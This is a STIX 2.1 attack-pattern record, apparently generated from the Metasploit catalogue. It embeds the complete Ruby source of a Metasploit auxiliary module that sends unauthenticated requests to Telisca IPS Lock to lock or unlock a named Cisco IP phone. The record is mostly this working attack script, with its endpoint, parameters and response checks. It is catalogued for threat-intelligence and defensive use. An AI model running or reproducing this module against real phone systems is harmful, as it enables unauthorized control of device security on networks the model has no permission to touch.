{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ca17740b-60ed-417c-ad70-8bb3eb73c593",
    "created": "2024-08-14T16:31:23.73406Z",
    "modified": "2024-08-14T16:31:23.734064Z",
    "name": "Telisca IPS Lock Cisco IP Phone Control",
    "description": " This module allows an unauthenticated attacker to exercise the \"Lock\" and \"Unlock\" functionality of Telisca IPS Lock for Cisco IP Phones. This module should be run in the VoIP VLAN, and requires knowledge of the target phone's name (for example, SEP002497AB1D4B).  Set ACTION to either LOCK or UNLOCK. UNLOCK is the default.  'References'     => [ # Publicly disclosed via Metasploit PR",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/voip/telisca_ips_lock_control.rb",
            "external_id": "telisca_ips_lock_control.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Telisca IPS Lock Cisco IP Phone Control',\n      'Description'    => %q{\n        This module allows an unauthenticated attacker to exercise the\n        \"Lock\" and \"Unlock\" functionality of Telisca IPS Lock for Cisco IP\n        Phones. This module should be run in the VoIP VLAN, and requires\n        knowledge of the target phone's name (for example, SEP002497AB1D4B).\n\n        Set ACTION to either LOCK or UNLOCK. UNLOCK is the default.\n      },\n      'References'     =>\n        [\n          # Publicly disclosed via Metasploit PR\n          'URL', 'https://github.com/rapid7/metasploit-framework/pull/6470'\n        ],\n      'Author'         =>\n        [\n          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',\n          'zirsalem'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2015-12-17',\n      'Actions'        =>\n       [\n         ['LOCK', 'Description' => 'To lock a phone'],\n         ['UNLOCK', 'Description' => 'To unlock a phone']\n       ],\n       'DefaultAction' => 'UNLOCK'\n    ))\n\n    register_options(\n      [\n        OptAddress.new('RHOST', [true, 'The IPS Lock IP Address']),\n        OptString.new('PHONENAME', [true, 'The name of the target phone'])\n      ])\n\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_good(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  # Returns the status of the listening port.\n  #\n  # @return [Boolean] TrueClass if port open, otherwise FalseClass.\n  def port_open?\n    begin\n      res = send_request_raw({'method' => 'GET', 'uri' => '/'})\n      return true if res\n    rescue ::Rex::ConnectionRefused\n      vprint_status(\"Connection refused\")\n    rescue ::Rex::ConnectionError\n      vprint_error(\"Connection failed\")\n    rescue ::OpenSSL::SSL::SSLError\n      vprint_error(\"SSL/TLS connection error\")\n    end\n\n    false\n  end\n\n  # Locks a device.\n  #\n  # @param phone_name [String] Name of the phone used for the pn parameter.\n  #\n  # @return [void]\n  def lock(phone_name)\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => '/IPSPCFG/user/Default.aspx',\n      'headers'   => {\n        'Connection' => 'keep-alive',\n        'Accept-Language' => 'en-US,en;q=0.5'\n      },\n      'vars_get'  => {\n        'action'  => 'DO',\n        'tg' => 'L',\n        'pn' => phone_name,\n        'dp' => '',\n        'gr' => '',\n        'gl' => ''\n      }\n    })\n\n    if res && res.code == 200\n      if res.body.include?('Unlock') || res.body.include?('U7LCK')\n        print_good(\"The device #{phone_name} is already locked\")\n      elsif res.body.include?('unlocked') || res.body.include?('Locking') || res.body.include?('QUIT')\n        print_good(\"Device #{phone_name} successfully locked\")\n      end\n    elsif res\n      print_error(\"Unexpected response #{res.code}\")\n    else\n      print_error('The connection timed out while trying to lock.')\n    end\n  end\n\n\n  # Unlocks a phone.\n  #\n  # @param phone_name [String] Name of the phone used for the pn parameter.\n  #\n  # @return [void]\n  def unlock(phone_name)\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => '/IPSPCFG/user/Default.aspx',\n      'headers'   => {\n        'Connection' => 'keep-alive',\n        'Accept-Language' => 'en-US,en;q=0.5'\n      },\n      'vars_get' => {\n        'action' => 'U7LCK',\n        'pn'     => phone_name,\n        'dp'     => ''\n      }\n    })\n\n    if res && res.code == 200\n      if res.body.include?('Unlock') || res.body.include?('U7LCK')\n        print_good(\"The device #{phone_name} is already locked\")\n      elsif res.body.include?('unlocked') || res.body.include?('QUIT')\n        print_good(\"The device #{phone_name} successfully unlocked\")\n      end\n    elsif res\n      print_error(\"Unexpected response #{res.code}\")\n    else\n      print_error('The connection timed out while trying to unlock')\n    end\n  end\n\n\n  def run\n    unless port_open?\n      print_error('The web server is unreachable!')\n      return\n    end\n\n    phone_name = datastore['PHONENAME']\n    case action.name\n      when 'LOCK'\n        lock(phone_name)\n      when 'UNLOCK'\n        unlock(phone_name)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-12-17"
}